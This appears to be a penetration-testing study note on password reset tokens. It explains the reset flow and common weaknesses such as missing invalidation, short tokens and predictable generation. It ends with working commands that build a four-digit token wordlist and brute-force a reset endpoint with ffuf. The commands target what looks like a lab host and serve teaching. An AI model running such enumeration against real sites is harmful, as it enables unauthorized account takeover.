## Brute-forcing password reset tokens

Many web applications implement a password recovery functionality in case a user forgets their password.

- This password-recovery functionality typically relies on a one-time reset token, which is transmitted to the user, for instance, via SMS or email, similar to what is used in MFA.
- The user can then authenticate using this token only, and change their password. 

### Password reset logic via tokens

>A **password reset token** is a **single-use, cryptographically secure, and time-limited** code or link generated by a server to verify a user’s identity via an out-of-band channel (like email) when they have forgotten their password.

![[password_reset_token_logic.svg]]


Password reset flow via reset token:

1. **Forgot password**
	- The user clicks `Forgot password` in a login form. 
2. **Request password reset**
	- The browser sends a request to the backend to reset the user password. 
3. **Generate a password reset token**
	- The application generates a random, single-use token.
4. **Send the token via email/SMS**
	- The token is then send to the user via an alternative communication channel they had previously configured, such as email or SMS.
5. **Receive the token**
	- The user opens their email/SMS and copes token.
6. **Enter the token to a reset form**
	- The user then enters the token to the password reset form.
7. **Verify and invalidate the token**
	- The application receives the token from the user, verifies it, and if correct, invalidates the token. 
8. **Authenticate the user**
	- The application then authenticates the user, for example, by issuing a session ID cookie or JWT, just like with a normal login.
9. **Change password**
	- The user then changes their password. 

Rather than sending a numeric token directly, the application may instead send a link like this:

```powershell
https://example.com/reset_password.php?token=1337
```

The user clicks the link in the email, the application receives the token via the `GET` parameter, verifies and invalidates it, and then logs the user in.

This mechanism is as strong as its implementation. Possible issues may include:
- Lack of token invalidation before expiration
	- The application simply lets the user in and forgets about the token when it must invalidate it. This allows an attacker to reuse the token. 
- Easy-to-guess tokens and lack of token brute-force protection
	- If the token is short and the application doesn't implement any token brute-force protection, an attacker can enumerate the token.
- Predictable token generation
	- If the token is generated using a predictable pattern, the attacker might as well guess it. 

## Brute-forcing password reset tokens

- Generate a token wordlist:

```bash
seq -w 0 9999 > tokens.txt
```

- The `-w` flag pads all numbers to the same length by prepending zeroes.

- Enumerate tokens:


```bash
ffuf -w tokens.txt -u http://154.57.164.83:32656/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
